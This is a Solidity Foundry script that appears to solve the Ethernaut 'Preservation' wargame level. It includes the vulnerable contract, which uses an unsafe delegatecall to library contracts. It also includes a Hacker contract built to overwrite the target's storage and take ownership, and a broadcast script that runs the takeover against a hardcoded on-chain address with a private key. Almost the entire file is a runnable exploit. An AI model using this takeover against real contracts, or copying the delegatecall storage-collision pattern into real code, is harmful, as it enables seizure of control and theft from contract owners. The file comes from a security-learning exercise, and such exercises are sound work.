// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract Hacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 

    function hack(Preservation target) public {
        target.setFirstTime(uint256(uint160(msg.sender)));
        require(target.owner() == msg.sender, "failed to hack");
    }

    function setTime(uint _owner) external {
        owner = address(uint160(_owner));
    }
}

contract DeployScript is Script {
    function setUp() public view {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        Preservation target = Preservation(0x10CC123ad9d29134c0071f79aB280DD9c1E36a03);
        Hacker hacker = new Hacker();
        target.setFirstTime(uint256(uint160(address(hacker))));

        console.log(target.timeZone1Library(), address(hacker), target.timeZone2Library());
        hacker.hack(target);
        vm.stopBroadcast();
    }
}